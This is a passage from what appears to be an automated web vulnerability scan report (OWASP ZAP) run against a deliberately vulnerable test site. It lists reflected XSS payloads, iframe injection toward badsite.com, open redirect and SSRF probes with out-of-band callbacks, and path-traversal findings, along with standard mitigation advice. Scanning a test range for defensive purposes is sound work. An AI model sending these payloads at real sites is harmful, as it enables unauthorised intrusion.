* URL: https://public-firing-range.appspot.com/reflected/parameter/body/400%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/401%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/403%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/404%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body/500%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/body_comment%3Fq=--%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253C%2521--
  * Method: `GET`
  * Parameter: `q`
  * Attack: `--><scrIpt>alert(1);</scRipt><!--`
  * Evidence: `--><scrIpt>alert(1);</scRipt><!--`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style%3Fq=%253C%252Fstyle%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cstyle%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</style><scrIpt>alert(1);</scRipt><style>`
  * Evidence: `</style><scrIpt>alert(1);</scRipt><style>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style_font_value%3Fq=%253C%252Fstyle%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cstyle%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</style><scrIpt>alert(1);</scRipt><style>`
  * Evidence: `</style><scrIpt>alert(1);</scRipt><style>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/css_style_value%3Fq=%253C%252Fstyle%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cstyle%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</style><scrIpt>alert(1);</scRipt><style>`
  * Evidence: `</style><scrIpt>alert(1);</scRipt><style>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/head%3Fq=%253C%252Fhead%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Chead%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</head><scrIpt>alert(1);</scRipt><head>`
  * Evidence: `</head><scrIpt>alert(1);</scRipt><head>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/iframe_attribute_value%3Fq=%2527+src%253Dhttp%253A%252F%252Fbadsite.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: `' src=http://badsite.com`
  * Evidence: `' src=http://badsite.com`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/iframe_srcdoc%3Fq=%2522+src%253Dhttp%253A%252F%252Fbadsite.com
  * Method: `GET`
  * Parameter: `q`
  * Attack: `" src=http://badsite.com`
  * Evidence: `" src=http://badsite.com`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_assignment%3Fq=%253C%252Fscript%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cscript%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</script><scrIpt>alert(1);</scRipt><script>`
  * Evidence: `</script><scrIpt>alert(1);</scRipt><script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_comment%3Fq=%2522%253Balert%25281%2529%253B%2522
  * Method: `GET`
  * Parameter: `q`
  * Attack: `";alert(1);"`
  * Evidence: `";alert(1);"`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_eval%3Fq=%2522%253Balert%25281%2529%253B%2522
  * Method: `GET`
  * Parameter: `q`
  * Attack: `";alert(1);"`
  * Evidence: `";alert(1);"`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_quoted_string%3Fq=%2522%253Balert%25281%2529%253B%2522
  * Method: `GET`
  * Parameter: `q`
  * Attack: `";alert(1);"`
  * Evidence: `";alert(1);"`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_singlequoted_string%3Fq=%2527%253Balert%25281%2529%253B%2527
  * Method: `GET`
  * Parameter: `q`
  * Attack: `';alert(1);'`
  * Evidence: `';alert(1);'`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/js_slashquoted_string%3Fq=%253C%252Fscript%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cscript%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</script><scrIpt>alert(1);</scRipt><script>`
  * Evidence: `</script><scrIpt>alert(1);</scRipt><script>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/json%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/noscript%3Fq=%253C%252Fnoscript%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Cnoscript%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</noscript><scrIpt>alert(1);</scRipt><noscript>`
  * Evidence: `</noscript><scrIpt>alert(1);</scRipt><noscript>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/style_attribute_value%3Fq=%2527%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `'><scrIpt>alert(1);</scRipt>`
  * Evidence: `'><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/tagname%3Fq=%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `<scrIpt>alert(1);</scRipt>`
  * Evidence: `<scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/tagname%3Fq=tag+accesskey%253D%2527x%2527+onclick%253D%2527alert%25281%2529%2527+b
  * Method: `GET`
  * Parameter: `q`
  * Attack: `tag accesskey='x' onclick='alert(1)' b`
  * Evidence: `tag accesskey='x' onclick='alert(1)' b`
  * Other Info: `The accesskey attribute specifies a shortcut key to activate/focus an element. This attribute can trigger payloads for non-conventional or custom tags.`
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea%3Fq=%253C%252Ftextarea%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Ctextarea%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</textarea><scrIpt>alert(1);</scRipt><textarea>`
  * Evidence: `</textarea><scrIpt>alert(1);</scRipt><textarea>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/textarea_attribute_value%3Fq=%2527%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `'><scrIpt>alert(1);</scRipt>`
  * Evidence: `'><scrIpt>alert(1);</scRipt>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/title%3Fq=%253C%252Ftitle%253E%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E%253Ctitle%253E
  * Method: `GET`
  * Parameter: `q`
  * Attack: `</title><scrIpt>alert(1);</scRipt><title>`
  * Evidence: `</title><scrIpt>alert(1);</scRipt><title>`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/url/css_import%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/url/href%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/url/object_data%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/url/script_src%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object/application_x-shockwave-flash%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/object_raw%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=javascript%253Aalert%25281%2529%253B
  * Method: `GET`
  * Parameter: `q`
  * Attack: `javascript:alert(1);`
  * Evidence: `javascript:alert(1);`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `POST`
  * Parameter: `q`
  * Attack: `</p><scrIpt>alert(1);</scRipt><p>`
  * Evidence: `</p><scrIpt>alert(1);</scRipt><p>`
  * Other Info: ``

Instances: 63

### Solution

Phase: Architecture and Design
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

Phases: Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.

Phase: Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

Phase: Implementation
For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.

To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
	

### Reference


* [ https://owasp.org/www-community/attacks/xss/ ](https://owasp.org/www-community/attacks/xss/)
* [ https://cwe.mitre.org/data/definitions/79.html ](https://cwe.mitre.org/data/definitions/79.html)


#### CWE Id: [ 79 ](https://cwe.mitre.org/data/definitions/79.html)


#### WASC Id: 8

#### Source ID: 1

### [ External Redirect ](https://www.zaproxy.org/docs/alerts/20019/)



##### High (Medium)

### Description

URL redirectors represent common functionality employed by web sites to forward an incoming request to an alternate resource. This can be done for a variety of reasons and is often done to allow resources to be moved within the directory structure and to avoid breaking functionality for users that request the resource at its previous location. URL redirectors may also be used to implement load balancing, leveraging abbreviated URLs or recording outgoing links. It is this last implementation which is often used in phishing attacks as described in the example below. URL redirectors do not necessarily represent a direct security vulnerability but can be abused by attackers trying to social engineer victims into believing that they are navigating to a site other than the true destination.

* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=http%253A%252F%252F4254633201392006464.owasp.org
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://4254633201392006464.owasp.org`
  * Evidence: `http://4254633201392006464.owasp.org`
  * Other Info: `The response contains a redirect in its Location header which allows an external Url to be set.`
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=http%253A%252F%252F4254633201392006464.owasp.org
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://4254633201392006464.owasp.org`
  * Evidence: `http://4254633201392006464.owasp.org`
  * Other Info: `The response contains a redirect in its Location header which allows an external Url to be set.`
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http%253A%252F%252F4254633201392006464.owasp.org
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://4254633201392006464.owasp.org`
  * Evidence: `http://4254633201392006464.owasp.org`
  * Other Info: `The response contains a redirect in its Location header which allows an external Url to be set.`

Instances: 3

### Solution

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

Use an allow list of approved URLs or domains to be used for redirection.

Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving your site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems when generating the disclaimer page.

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

For example, ID 1 could map to "/login.asp" and ID 2 could map to "https://www.example.com/". Features such as the ESAPI AccessReferenceMap provide this capability.

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.

Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
* [ https://cwe.mitre.org/data/definitions/601.html ](https://cwe.mitre.org/data/definitions/601.html)


#### CWE Id: [ 601 ](https://cwe.mitre.org/data/definitions/601.html)


#### WASC Id: 38

#### Source ID: 1

### [ Open Redirect ](https://www.zaproxy.org/docs/alerts/10028/)



##### High (Medium)

### Description

Open redirects are one of the OWASP 2010 Top Ten vulnerabilities. This check looks at user-supplied input in query string parameters and POST data to identify where open redirects might be possible. Open redirects occur when an application allows user-supplied input (e.g. http://nottrusted.com) to control an offsite redirect. This is generally a pretty accurate way to find where 301 or 302 redirects could be exploited by spammers or phishing attacks.

For example an attacker could supply a user with the following link: http://example.com/example.php?url=http://malicious.example.com.

* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `url`
  * Attack: ``
  * Evidence: ``
  * Other Info: `The 301 or 302 response to a request for the following URL appeared to contain user input in the location header:

https://public-firing-range.appspot.com/urldom/redirect?url=http://example.com

The user input found was:

url=http://example.com

The context was:

http://example.com`

Instances: 1

### Solution

To avoid the open redirect vulnerability, parameters of the application script/program must be validated before sending 302 HTTP code (redirect) to the client browser. Implement safe redirect functionality that only redirects to relative URI's, or a list of trusted domains

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
* [ https://cwe.mitre.org/data/definitions/601.html ](https://cwe.mitre.org/data/definitions/601.html)


#### CWE Id: [ 601 ](https://cwe.mitre.org/data/definitions/601.html)


#### WASC Id: 38

#### Source ID: 3

### [ Server Side Request Forgery ](https://www.zaproxy.org/docs/alerts/40046/)



##### High (Medium)

### Description

The web server receives a remote address and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.

* URL: https://public-firing-range.appspot.com/redirect/parameter/NOSTARTSWITHJS%3Furl=/
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://10.1.0.7:34815/998e846c-15d6-43c1-b2cf-9639da6f5a84`
  * Evidence: ``
  * Other Info: `Received out-of-band interaction [GET http://10.1.0.7:34815/998e846c-15d6-43c1-b2cf-9639da6f5a84 HTTP/1.1]
Request
GET http://10.1.0.7:34815/998e846c-15d6-43c1-b2cf-9639da6f5a84 HTTP/1.1
host: 10.1.0.7:34815
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
pragma: no-cache
cache-control: no-cache
referer: https://public-firing-range.appspot.com/redirect/index.html


Response
HTTP/1.1 200
Content-Length: 0
Connection: close


--------------------------------`
* URL: https://public-firing-range.appspot.com/redirect/parameter%3Furl=/
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://10.1.0.7:34815/1a6c95e4-32ce-43da-be5d-12a1ea4ebc44`
  * Evidence: ``
  * Other Info: `Received out-of-band interaction [GET http://10.1.0.7:34815/1a6c95e4-32ce-43da-be5d-12a1ea4ebc44 HTTP/1.1]
Request
GET http://10.1.0.7:34815/1a6c95e4-32ce-43da-be5d-12a1ea4ebc44 HTTP/1.1
host: 10.1.0.7:34815
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
pragma: no-cache
cache-control: no-cache
referer: https://public-firing-range.appspot.com/redirect/index.html


Response
HTTP/1.1 200
Content-Length: 0
Connection: close


--------------------------------`
* URL: https://public-firing-range.appspot.com/urldom/redirect%3Furl=http://example.com
  * Method: `GET`
  * Parameter: `url`
  * Attack: `http://10.1.0.7:34815/8685cd4b-0ed6-4959-aed2-bfe51da87396`
  * Evidence: ``
  * Other Info: `Received out-of-band interaction [GET http://10.1.0.7:34815/8685cd4b-0ed6-4959-aed2-bfe51da87396 HTTP/1.1]
Request
GET http://10.1.0.7:34815/8685cd4b-0ed6-4959-aed2-bfe51da87396 HTTP/1.1
host: 10.1.0.7:34815
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
pragma: no-cache
cache-control: no-cache
referer: https://public-firing-range.appspot.com/urldom/index.html


Response
HTTP/1.1 200
Content-Length: 0
Connection: close


--------------------------------`

Instances: 3

### Solution

Do not accept remote addresses as request parameters, and if you must, ensure that they are validated against an allow-list of expected values.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)


#### CWE Id: [ 918 ](https://cwe.mitre.org/data/definitions/918.html)


#### WASC Id: 20

#### Source ID: 1

### [ Source Code Disclosure - File Inclusion ](https://www.zaproxy.org/docs/alerts/43/)



##### High (Medium)

### Description

The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.

Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.

The most basic Path Traversal attack uses the "../" special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the "../" sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding ("..%u2216" or "..%c0%af") of the forward slash character, backslash characters ("..\") on Windows-based servers, URL encoded characters "%2e%2e%2f"), and double URL encoding ("..%255c") of the backslash character.

Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or load static text from files. In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (".") to reveal the listing of the current working directory, or "%00" NULL characters in order to bypass rudimentary file extension checks.

* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_name`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_name] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [59%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_quoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_quoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_singlequoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_singlequoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [61%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_unquoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_unquoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [62%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `body_comment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [body_comment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [60%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `css_style`
  * Evidence: ``
  * Other Info: `The output for the source code filename [css_style] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [69%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/head%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `head`
  * Evidence: ``
  * Other Info: `The output for the source code filename [head] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_assignment`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_assignment] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [68%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_eval`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_eval] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [66%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_quoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_quoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [67%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_singlequoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_singlequoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `js_slashquoted_string`
  * Evidence: ``
  * Other Info: `The output for the source code filename [js_slashquoted_string] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [65%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/tagname%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `tagname`
  * Evidence: ``
  * Other Info: `The output for the source code filename [tagname] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [56%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/textarea%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `textarea`
  * Evidence: ``
  * Other Info: `The output for the source code filename [textarea] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [70%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_name`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_name] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [59%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_quoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_quoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [64%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_singlequoted`
  * Evidence: ``
  * Other Info: `The output for the source code filename [attribute_singlequoted] differs sufficiently from that of the random parameter [nbyhdareeniprwgofvfhzekifwzrqrdfrueicd], at [61%], compared to a threshold of [75%]`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: `q`
  * Attack: `attribute_unquoted`
  * Evidence: ``
